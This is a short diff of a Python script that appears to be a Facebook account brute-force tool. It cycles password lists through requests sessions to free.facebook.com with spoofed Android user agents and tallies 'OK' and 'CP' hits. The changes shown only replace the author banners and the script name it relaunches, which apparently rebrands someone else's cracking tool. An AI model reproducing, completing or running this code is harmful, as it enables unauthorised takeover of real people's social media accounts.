@@ -43,7 +43,7 @@ try:
 except ModuleNotFoundError: 
 	print('\n Installing missing modules ...')
 	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python SHAHBAZ.py')
+	os.system('python hi.py')
 ugen = []
 for xd in range(5000):
 	aa='Mozilla/5.0 (Linux; U; Android'
@@ -258,7 +258,7 @@ def fia():
 				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 				linex()
 				input(' Press enter to back ')
-				os.system('python FAISAL.py')
+				os.system('python hi.py')
 			elif xd in ['2','02']:
 				menu()
 			elif xd in ['3','03']:
@@ -314,7 +314,7 @@ def mmm(ids,names,passlist):
 	loop+=1
 def ffb(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m[FAISAL / NAZIR] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m[HAMZA / SAMAD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -514,7 +514,7 @@ def fcrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r [\033[1;97mFAISAL / NAZIR\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
+			sys.stdout.write(f'\r [\033[1;97mHAMZA / SAMAD\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
 			sys.stdout.flush()
 			ua = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
